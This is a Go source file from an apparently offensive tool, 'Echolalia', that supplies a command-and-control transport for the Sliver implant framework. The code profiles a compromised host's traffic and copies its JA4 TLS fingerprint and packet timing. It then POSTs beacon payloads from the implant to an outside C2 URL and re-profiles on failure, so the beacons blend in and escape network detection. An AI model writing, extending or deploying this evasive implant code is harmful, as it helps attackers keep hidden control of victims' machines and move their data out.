package transport

import (
	"bytes"
	"context"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/Emul4nt/echolalia/mimicry"
	"github.com/Emul4nt/echolalia/profiler"
)

// SliverCore is the interface Echolalia needs from the Sliver implant core.
// Adapt to Sliver's actual internal interface at integration time.
type SliverCore interface {
	GetBeaconPayload() ([]byte, error)
	DeliverResponse(data []byte) error
}

// EcholaliaTransport implements a Sliver-compatible transport that shapes
// beacon traffic to match a profiled process's statistical footprint.
type EcholaliaTransport struct {
	core          SliverCore
	profile       *profiler.TrafficProfile
	c2URL         string
	client        *http.Client
	failStreak    int
	lastReprofile time.Time
}

// NewWithProfile creates an EcholaliaTransport from an already-captured profile.
// Use this when the caller has profiled the host independently.
func NewWithProfile(profile *profiler.TrafficProfile, core SliverCore, c2URL string) (*EcholaliaTransport, error) {
	tlsCfg, warnings, err := mimicry.ParseJA4(profile.JA4)
	if err != nil {
		log.Printf("[echolalia] JA4 parse warning: %v — using default TLS config", err)
	}
	for _, w := range warnings {
		log.Printf("[echolalia] JA4 warning: %s", w)
	}
	tr := &http.Transport{}
	if tlsCfg != nil {
		tr.TLSClientConfig = tlsCfg
	}
	return &EcholaliaTransport{
		core:          core,
		profile:       profile,
		c2URL:         c2URL,
		client:        &http.Client{Transport: tr},
		lastReprofile: time.Now(),
	}, nil
}

// New creates an EcholaliaTransport. It runs the profiler immediately to build
// the initial TrafficProfile. ctx controls the profiling window (default 60s).
func New(ctx context.Context, core SliverCore, c2URL string) (*EcholaliaTransport, error) {
	profile, err := profiler.Profile(ctx, 60*time.Second)
	if err != nil {
		return nil, fmt.Errorf("initial profiling failed: %w", err)
	}

	tlsCfg, warnings, err := mimicry.ParseJA4(profile.JA4)
	if err != nil {
		log.Printf("[echolalia] JA4 parse warning: %v — using default TLS config", err)
	}
	for _, w := range warnings {
		log.Printf("[echolalia] JA4 warning: %s", w)
	}

	transport := &http.Transport{}
	if tlsCfg != nil {
		transport.TLSClientConfig = tlsCfg
	}

	return &EcholaliaTransport{
		core:          core,
		profile:       profile,
		c2URL:         c2URL,
		client:        &http.Client{Transport: transport},
		lastReprofile: time.Now(),
	}, nil
}

// Beacon retrieves a payload from the Sliver core, shapes it, and sends it to C2.
func (t *EcholaliaTransport) Beacon(ctx context.Context) error {
	payload, err := t.core.GetBeaconPayload()
	if err != nil {
		return fmt.Errorf("GetBeaconPayload: %w", err)
	}

	seq, err := mimicry.Shape(t.profile, payload)
	if err != nil {
		return fmt.Errorf("mimicry.Shape: %w", err)
	}

	for _, pkt := range seq.Packets {
		delay := time.Until(pkt.SendAt)
		if delay > 0 {
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(delay):
			}
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, t.c2URL, bytes.NewReader(pkt.Data))
		if err != nil {
			t.failStreak++
			t.maybeReprofile(ctx)
			return fmt.Errorf("build request: %w", err)
		}

		contentType := "application/octet-stream"
		if t.profile.Protocol == "http2" {
			contentType = "application/grpc"
		}
		req.Header.Set("Content-Type", contentType)

		resp, err := t.client.Do(req)
		if err != nil {
			t.failStreak++
			t.maybeReprofile(ctx)
			return fmt.Errorf("send: %w", err)
		}
		resp.Body.Close()
		t.failStreak = 0
	}

	if time.Since(t.lastReprofile) > 4*time.Hour {
		go t.reprofile(context.Background())
	}

	return nil
}

func (t *EcholaliaTransport) maybeReprofile(ctx context.Context) {
	if t.failStreak >= 3 {
		log.Printf("[echolalia] %d consecutive failures — re-profiling", t.failStreak)
		t.reprofile(ctx)
		t.failStreak = 0
	}
}

func (t *EcholaliaTransport) reprofile(ctx context.Context) {
	pCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	newProfile, err := profiler.Profile(pCtx, 30*time.Second)
	if err != nil {
		log.Printf("[echolalia] re-profile failed: %v — keeping existing profile", err)
		return
	}
	t.profile = newProfile
	t.lastReprofile = time.Now()
	log.Printf("[echolalia] re-profiled: new target process is %q", newProfile.ProcessName)
}
